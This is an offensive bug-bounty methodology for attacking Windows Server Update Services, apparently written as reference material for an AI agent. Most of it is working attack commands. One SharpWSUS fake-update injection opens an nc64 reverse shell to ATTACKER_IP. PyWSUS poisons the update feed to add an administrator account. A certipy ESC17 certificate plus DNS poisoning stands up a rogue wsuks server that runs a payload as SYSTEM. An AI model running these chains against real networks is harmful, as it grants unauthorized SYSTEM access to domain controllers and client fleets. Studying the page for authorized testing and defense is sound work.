---
technology: "WSUS (Windows Server Update Services)"
kind: bug-bounty-methodology
audience: ai-agent
family: windows
provenance: "thin unit — first-class depth. Observed chains quoted: SharpWSUS (registry locate, create/approve with PsExec64 + nc64 args) and certipy-esc17 → wsus.pem → wsuks serve-only rogue TLS WSUS delivering KB-numbered payload as SYSTEM. Upstream: SharpWSUS usage references, GoSecure PyWSUS, Syslifters handbook (WSUS privesc + lateral movement), ESC17/wsuks research (M. N. Durukan), Microsoft guidance (8530/8531, TLS requirement), CVE-2025-59287 advisories (KEV). Safe values substituted. Verified 2026-11-12."
---

# WSUS bug bounty methodology

Target model: an AD estate where clients pull updates from an internal WSUS
server (8530 HTTP / 8531 HTTPS). You may start as: a domain user, a shell on
a client, a WSUS Administrators member / local admin on the server, an
on-path position, or an AD-CS enrollment capability. Companion overview:
[[wsus|WSUS]]. AD-CS mechanics live in [[ad-cs]]; DNS poisoning tools in
[[dns]] context.

## Triage table

| Surface | Gate | Start privilege | Payoff |
|---|---|---|---|
| WSUS discovery + transport check | 8530/8531 visible or client registry | any | Attack-path selection — recon |
| WSUS-admin update injection (SharpWSUS) | local admin / WSUS Administrators / SUSDB rights | server-side priv | SYSTEM on any enrolled host (incl. DC) — Critical |
| On-path HTTP poisoning (PyWSUS) | client feed on plain HTTP + network position | none on hosts | SYSTEM on clients at next poll — Critical |
| Rogue HTTPS WSUS (ESC17 + wsuks) | server-auth cert for arbitrary SAN + DNS poison | domain user (enroll) + DNS write | SYSTEM on clients, TLS bypassed — Critical |
| Fake-update content tricks | WsusContent write / update metadata | WSUS DB rights | same as injection |
| CVE-2025-59287 (Oct 2025, KEV) | unpatched WSUS server | none (pre-auth deserialization RCE) | Server compromise — Critical |

Payload rule for every injection path: the "update" executable must be
**Microsoft-signed**; the command line is yours. The canonical shape is a
Sysinternals binary: `PsExec64.exe -accepteula -s -d <command>` (BgInfo
works too).

## Phase 0 — Find the server and read the transport

```bash
nmap -p 8530,8531 -sV 198.51.100.40        # WSUS role fingerprint (IIS httpd)
```

On any client shell (observed form):

```cmd
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
:: WUServer / WUStatusServer values name the WSUS host (http:// = plain feed)
:: AU\UseWUServer = 1 proves the client actually uses it
whoami /groups     :: WSUS Administrators membership = Phase 1 is yours
```

Decision: `http://` WUServer → Phase 2 is open from a network position.
HTTPS feed → Phase 3 (needs a trusted cert). WSUS-admin rights → Phase 1
(no network games needed).

## Phase 1 — WSUS-admin: inject a legitimate-looking update (SharpWSUS)

The observed chain against the domain controller:

```cmd
:: 1. create the fake update — payload is a Microsoft-signed binary + your args
SharpWSUS.exe create /payload:"C:\Users\user\Desktop\PsExec64.exe" ^
  /args:"-accepteula -s -d c:\users\user\desktop\nc64.exe -e cmd.exe ATTACKER_IP 9001" ^
  /title:"pwned"

:: 2. approve it for the target host (updateid comes from step 1's output)
SharpWSUS.exe approve /updateid:<guid> /computername:dc.lab.corp /groupname:"pwned"

:: 3. check delivery (and clean up afterwards)
SharpWSUS.exe check   /updateid:<guid> /computername:dc.lab.corp
SharpWSUS.exe delete  /updateid:<guid> /computername:dc.lab.corp /groupname:"pwned"
```

Operational notes (upstream + observed):
- Force the client's next poll from any shell on it: `usoclient StartScan`
  (Win10/11) or `wuauclt /detectnow` (older). Otherwise expect the scheduled
  poll (observed: "a few minutes").
- Known SharpWSUS quirk: the WsusContent file sometimes fails to place — read
  Application event **364** for the expected path/filename and copy the
  binary there by hand, then retry download in the console.
- Group-add variant (non-English boxes use the well-known SID):
  `/accepteula /s cmd.exe /c "net localgroup S-1-5-32-544 LAB\user /add"`.
- Delivery runs as **NT AUTHORITY\SYSTEM** on the approved computer — the
  group you targeted, not the whole fleet.

## Phase 2 — On-path HTTP: poison the update feed (PyWSUS)

Works whenever the client's WUServer is plain HTTP and you hold a MitM
position — ARP spoofing (same broadcast domain), mitm6 (Windows prefers IPv6
DNS), or DHCP spoofing without snooping:

```bash
sudo python3 pywsus.py -H 0.0.0.0 -p 8530 \
  -e PsExec64.exe \
  -c '/accepteula /s cmd.exe /c "net localgroup Administrators LAB\user /add"'
# -e: the Microsoft-signed binary served as the "update"
# -c: your command line, executed as SYSTEM at install time
```

No server-side privileges involved at all — you answer the client's metadata
request and it pulls the "update" from you. Force the poll (Phase 1 commands)
rather than waiting.

## Phase 3 — Rogue HTTPS WSUS (ESC17 + wsuks) — the observed ESC17 chain

When the feed is TLS, the remaining trust anchor is the domain CA. With a
certificate template granting **Server Authentication EKU + enrollee-supplied
subject** (ESC17 class — see [[ad-cs]]):

```bash
# 1. mint a legit server-auth cert for the WSUS hostname:
certipy-esc17 req -u 'user@lab.corp' -k -target DC01.lab.corp \
  -template UpdateSrv -ca lab-DC01-CA -dns wsus.lab.corp
# 2. convert for the rogue server:
openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:
# 3. poison DNS so the WSUS FQDN resolves to you (dynamic-update write or
#    dnscmd record add — see the dns unit)
# 4. stand up the rogue server:
sudo wsuks -t 198.51.100.50 --serve-only --WSUS-Server dc01.lab.corp \
  --tls-cert wsus.pem \
  -c '/accepteula /s cmd.exe "/c c:\programdata\rev.exe"'
# serves a fake KB over 8531 with a CA-trusted cert; client executes as SYSTEM
```

wsuks also has a discovery mode (`wsuks -u u -p p -d lab.corp --dc-ip <dc>
--only-discover`) that reports the WSUS server and whether HTTPS is in use —
useful before choosing Phase 2 vs 3.

## Phase 4 — CVE context and adjacent surfaces

| Item | What | Gate |
|---|---|---|
| CVE-2025-59287 (Oct 2025, CISA KEV) | Deserialization RCE on the WSUS service itself; CVSS 9.8, actively exploited; out-of-band patch Oct 23 2025 | unpatched server, 8530/8531 reachable |
| TLS-less metadata | Microsoft: without TLS an attacker can modify update information in transit — the documented basis of Phase 2 | HTTP feed |
| Delivery Optimization | Peer-update sharing (DoSvc) is a separate lateral channel — poisoned content can propagate peer-to-peer after the first install | DO enabled |

Cleanup obligations (all phases): delete the injected update
(`SharpWSUS.exe delete ...`), remove accounts/group memberships your payload
added, tear down the rogue server and DNS records, and note in the report
which control failed (group membership hygiene, HTTP feed, or CA template).

## Quick reference

```cmd
:: locate
nmap -p8530,8531 -sV <host>
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate ; whoami /groups
:: inject (as WSUS admin)
SharpWSUS.exe create /payload:"C:\PsExec64.exe" /args:"-accepteula -s -d <cmd>" /title:"KB9999999"
SharpWSUS.exe approve /updateid:<guid> /computername:<fqdn> /groupname:"g"
usoclient StartScan        :: force client poll (or wuauclt /detectnow)
SharpWSUS.exe check /updateid:<guid> /computername:<fqdn>
```

```bash
# rogue servers
pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '<args>'
wsuks -t <ip> --serve-only --WSUS-Server <fqdn> --tls-cert wsus.pem -c '<args>'
```

## Tool mapping (prose)

SharpWSUS (Chris Thompson, Mayyhem) is the server-side injection suite —
locate, inspect, create, approve, check, delete. PyWSUS (GoSecure) is the
Python rogue WSUS server for on-path HTTP poisoning. wsuks packages the
modern rogue-server workflow with discovery, TLS, and PsExec argument
shaping. certipy (ly4k) requests the ESC17 certificate; openssl converts the
PFX for wsuks. mitm6, bettercap, and DHCP-spoofing tooling supply the network
position; usoclient and wuauclt (native Windows) force the client-side poll.
Post-SYSTEM credential work continues in [[windows-secrets]]; the WSUS host
often co-hosts with SCCM — see [[sccm]].
